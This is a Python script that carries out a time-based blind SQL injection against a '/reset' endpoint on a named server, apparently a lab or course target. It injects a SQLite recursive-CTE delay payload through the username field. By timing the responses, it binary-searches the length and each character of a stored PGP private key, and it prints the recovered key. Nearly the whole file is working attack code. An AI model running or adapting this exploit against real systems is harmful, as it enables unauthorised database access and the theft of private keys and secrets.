import time
from statistics import median

import requests
from flask import Flask

app = Flask(__name__)

API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
# API_URL = 'http://127.0.0.1:3000/reset'
API_RUNS = 5
THRESHOLD_SECONDS = 0.2
COUNTER_DELAY = 600000


def check_payload_true(normal_reponse_time, sql_payload, threshold):
    sql_payload_time = measure_response_time(API_URL, sql_payload)
    if sql_payload_time > normal_reponse_time + threshold:
        # print(f"True for {sql_payload}")
        return True
    else:
        # print(f"False for {sql_payload}")
        return False


def build_sql_payload(condition):
    return {
        "username": "admin' AND (CASE WHEN (" + condition + ") THEN (SELECT sum(x) FROM (WITH RECURSIVE cnt(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM cnt WHERE x<" + COUNTER_DELAY.__str__() + ") SELECT x FROM cnt)) ELSE 0 END) like '1"}


def find_key_lenght(normal_reponse_time):
    key_length = 2000

    # checking upper limit
    key_is_bigger = True
    while (key_is_bigger):
        key_length = key_length * 2
        sql_payload = build_sql_payload("LENGTH(key)>" + key_length.__str__())
        key_is_bigger = check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
    print(f"🔑Key upper limit: {key_length} \n")

    # binary search
    low = 1
    high = key_length
    while low <= high:
        mid = (low + high) // 2
        sql_payload = build_sql_payload("LENGTH(key)>" + mid.__str__())
        key_is_bigger = check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)

        if key_is_bigger:
            low = mid + 1
        else:
            high = mid - 1

    if (check_payload_true(normal_reponse_time, build_sql_payload("LENGTH(key)==" + low.__str__()), THRESHOLD_SECONDS)):
        return low
    return high


def measure_response_time(url, input):
    request_times = []
    for run in range(API_RUNS):
        start = time.perf_counter()
        r = requests.post(f"{url}", data=input)
        # print(f"Response: {r.text}")
        end = time.perf_counter()
        request_times.append(end - start)
        # print(f"Run {run + 1}. Time: {request_times[run]} \n")
    avg_reponse_time = median(request_times)
    # print(f"Run Average Time: {avg_reponse_time} for input: {input} \n")
    return avg_reponse_time


def discover_char(normal_reponse_time, key_index):
    low, high = 32, 126  # ASCII printable range
    while low <= high:
        mid = (low + high) // 2
        sql_payload = build_sql_payload(f"substr(key,{key_index + 1},1)>'{chr(mid)}'")
        char_is_higher = check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
        # print(f"Mid: {mid}: {chr(mid)}\n")

        if char_is_higher:
            low = mid + 1
        else:
            high = mid - 1

    print(f"🚀🔑 Char: {low}: {chr(low)}\n")
    return chr(low)


def sql_injection_attack():
    print("\n🚀 Starting Measurement of API")
    normal_input = {"username": "admin"}
    normal_reponse_time = measure_response_time(API_URL, normal_input)

    # key_length = find_key_lenght(normal_reponse_time)
    # print(f"🔑Key Length: {key_length}\n")
    key_length = 3508

    prefix = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
    sql_payload = build_sql_payload(f"substr(key,1,{len(prefix)})=='{prefix}'")
    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
        print("🚀 Prefix check passed\n")
    #
    # sql_payload = build_sql_payload("substr(key,1,1)=='-'")
    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
    #
    # sql_payload = build_sql_payload(f"substr(key,{key_length - 2},{key_length-2})=='-'")
    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
    #
    # suffix = "-----END PGP PRIVATE KEY BLOCK-----"
    # sql_payload = build_sql_payload(f"substr(key,{key_length - len(suffix)},{key_length})=='{suffix}'")
    # if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
    #     print("🚀 Suffix check passed\n")

    # sql_payload = build_sql_payload(f"substr(key,1,1)>'{chr(ord('-') - 1)}'")  # 45
    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
    #
    # sql_payload = build_sql_payload(f"substr(key,1,1)=='{chr(ord('-'))}'")  # 45
    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
    #
    # sql_payload = build_sql_payload(f"substr(key,6,1)=='{chr(ord('B'))}'")
    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)

    # after loop each position index of the key to find the character
    key = ""
    for key_index in range(key_length):
        character = discover_char(normal_reponse_time, key_index)
        key = key + character
    print(f"🚀🔑 Key: {key}\n")

    # store in the CVS the time


if __name__ == '__main__':
    sql_injection_attack()
